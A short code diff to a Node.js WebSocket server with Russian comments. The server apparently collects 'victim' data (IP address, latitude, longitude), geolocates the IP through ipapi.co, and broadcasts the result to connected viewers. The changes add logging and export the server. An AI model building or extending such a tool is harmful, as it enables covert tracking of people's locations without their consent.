@@ -18,6 +18,9 @@ wss.on('connection', ws => {
             const data = JSON.parse(message);
             victimData = data;
 
+            // Лог полученных данных
+            console.log('Полученные данные от клиента:', data);
+
             // Получение геолокации по IP
             const ip = data.ip;
             const response = await axios.get(`https://ipapi.co/${ip}/json/`);
@@ -30,6 +33,9 @@ wss.on('connection', ws => {
                     longitude: data.longitude
                 };
             }
+
+            // Лог данных после обработки
+            console.log('Обработанные данные для отправки:', victimData);
 
             // Отправка данных всем подключенным клиентам
             wss.clients.forEach(client => {
@@ -55,6 +61,4 @@ app.get('/view', (req, res) => {
     res.sendFile(path.join(__dirname, 'view.html'));
 });
 
-server.listen(3000, () => {
-    console.log('Сервер запущен на порту 3000');
-});
+module.exports = server;
